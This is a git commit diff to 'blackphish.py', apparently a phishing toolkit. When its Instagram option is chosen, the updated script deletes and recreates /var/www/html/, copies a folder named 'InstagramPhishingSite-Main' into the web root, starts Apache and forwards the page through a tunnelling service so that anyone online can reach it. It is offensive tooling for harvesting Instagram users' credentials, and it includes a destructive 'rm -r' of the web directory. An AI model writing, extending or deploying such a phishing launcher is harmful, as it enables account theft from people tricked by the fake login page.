3084b4d21c449b71f501767fad3f431c1932ad3e
root <root@localhost.localdomain>
2019-10-31 14:40:37 +0530

    updated script now as the option 1 is chose then it brodcasts instagram page over

--- blackphish.py
+++ blackphish.py
@@ -49,7 +49,9 @@ def main():  # Main script #
 
     if choice == "1":
         print(green + '[+] Copying Files')
-        os.system('cp ' +'-r '+ cwd  + '/InstagramPhishingSite-Main' " /var/www/html/")
+        print(green + '[+] Cleaning /var/www/html/ First')
+        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
+        os.system('cp '+'-r '+ cwd  + '/InstagramPhishingSite-Main/' " /var/www/html/")
         print(green + '[+] Starting Apache2 Service')
         os.system('service apache2 start')
         serveo_forward()
